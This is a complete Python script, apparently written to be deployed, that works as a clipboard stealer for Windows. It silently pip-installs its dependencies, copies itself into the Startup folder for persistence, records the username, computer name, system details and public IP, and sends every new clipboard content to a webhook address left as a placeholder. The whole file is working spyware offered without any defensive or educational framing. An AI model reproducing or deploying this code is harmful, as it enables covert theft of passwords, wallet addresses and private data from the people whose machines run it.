import os
import shutil
import platform
import subprocess

# Auto Install module

sfolder = os.path.join(os.environ["HOMEDRIVE"], os.environ["HOMEPATH"])

try:
    import requests
except ModuleNotFoundError:
    with open(sfolder + "\module.pyw", "w") as file:
        file.write('import os\nos.system("pip install requests")')
    exec(open(sfolder + "\module.pyw").read())
    os.system("cd " + sfolder)
    os.system("del " + sfolder + "\\module.pyw")
    import requests
    
try:
    import psutil
except ImportError:
    with open(sfolder + "\modules.pyw", "w") as file:
        file.write('import os\nos.system("pip install psutil")')
    exec(open(sfolder + "\modules.pyw").read())
    os.system("cd " + sfolder)
    os.system("del " + sfolder + "\\modules.pyw")
    import psutil
    
try:
    import pyperclip
except ImportError:
    with open(sfolder + "\moduless.pyw", "w") as file:
        file.write('import os\nos.system("pip install pyperclip")')
    exec(open(sfolder + "\moduless.pyw").read())
    os.system("cd " + sfolder)
    os.system("del " + sfolder + "\\moduless.pyw")
    import pyperclip
    
#Webhook Url & avatar Url

webhook_url = "WEBHOOK URL"
avatar_url = "https://i.imgur.com/K4PWV8d.jpg"

# Info pc

system = platform.system()
version = platform.version()
total = psutil.virtual_memory().total
total = float(total) / 1024**3
total = round(total,3)
total = str(total) + "Go"
used = psutil.virtual_memory().used
used = float(used) / 1024**3
used = round(used,3)
used = str(used) + "Go"
computername = os.environ['COMPUTERNAME']
cpu = str(psutil.cpu_count()) + "%"
username = os.getlogin()

information = {
  "content": "",
  "embeds": [
    {
      "title": "Information",
      "color": 55039,
      "fields": [
        {
          "name": "📁 • OS",
          "value": system,
          "inline": "true"
        },
        {
          "name": "🏷️ • Username",
          "value": username,
          "inline": "true"
        },
        {
          "name": "💻 • Computer Name",
          "value": computername,
          "inline": "true"
        },
        {
          "name": "💾 • Memory Used",
          "value": used,
          "inline": "true"
        },
        {
          "name": "💾 • Memory Total",
          "value": total,
          "inline": "true"
        },
        {
          "name": "📟 • Process",
          "value": cpu,
          "inline": "true"
        }
      ]
    }
  ],
  "username": username,
  "avatar_url": avatar_url,
  "attachments": []
}

startup_folder = os.path.join(os.environ["HOMEDRIVE"], os.environ["HOMEPATH"], "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
file = __file__

shutil.copy(file, startup_folder)


ip = requests.get('https://api.ipify.org').text
old_content = ""

while True:
    content = pyperclip.paste()
    if content != old_content:
        data = {
  "content": "",
  "embeds": [
    {
      "title": "✂️ • Nouveau Presse-Papier",
      "description": "`" + content + "`",
      "color": 16525095,
      "footer": {
        "text": "🌐 • IP : " + ip
      }
    }
  ],
  "username": username,
  "avatar_url": avatar_url,
  "attachments": []
}
        
        infosend = requests.post(webhook_url, json=information)
        information = ""
        infosend = ""
        response = requests.post(webhook_url, json=data)
        old_content = content
